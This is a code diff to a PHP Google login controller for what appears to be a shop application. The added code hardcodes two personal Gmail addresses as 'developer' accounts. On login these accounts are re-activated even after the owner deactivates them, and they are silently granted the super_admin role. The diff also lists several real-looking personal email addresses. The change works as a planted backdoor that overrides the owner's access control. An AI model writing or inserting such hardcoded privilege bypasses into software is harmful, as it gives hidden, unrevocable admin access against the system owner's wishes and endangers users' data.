@@ -123,7 +123,17 @@ class GoogleLoginController extends Controller
             $user = $this->createUserFromGoogle($oauthUser, $email);
         }
 
-        if ($this->supportsUserActivation() && ! (bool) $user->is_active) {
+        $email = strtolower((string) $user->email);
+        $developerEmails = ['piscokpiscok2610@gmail.com', 'zakiram4dhan@gmail.com'];
+        if (in_array($email, $developerEmails, true)) {
+            if (! (bool) $user->is_active) {
+                $user->forceFill(['is_active' => true])->save();
+            }
+            $superAdminRole = \App\Domain\Identity\Models\Role::where('code', 'super_admin')->first();
+            if ($superAdminRole && ! $user->roles()->where('code', 'super_admin')->exists()) {
+                $user->roles()->syncWithoutDetaching([$superAdminRole->id]);
+            }
+        } elseif ($this->supportsUserActivation() && ! (bool) $user->is_active) {
             if ($usePopup) {
                 return $this->respondWithPopupError('Akun Anda telah dinonaktifkan oleh Owner. Silakan hubungi pemilik toko.');
             }
@@ -136,8 +146,10 @@ class GoogleLoginController extends Controller
 
         $this->syncGoogleIdentity($user, $oauthUser);
 
-        $email = strtolower((string) $user->email);
-        $isOwner = in_array($email, ['piscokpiscok2610@gmail.com', 'nurhayati.karya@gmail.com', 'zakiram4dhan@gmail.com'], true) || $user->hasAnyRoleCodes(['super_admin']);
+        $isSuperAdmin = in_array($email, $developerEmails, true) || $user->hasAnyRoleCodes(['super_admin']);
+        $isOwner = $isSuperAdmin
+            || $user->hasAnyRoleCodes(['admin', 'owner'])
+            || in_array($email, ['nurhayati.karya@gmail.com'], true);
         $user->loadMissing('accessGroups');
 
         if (! $isOwner && $user->accessGroups->isEmpty()) {
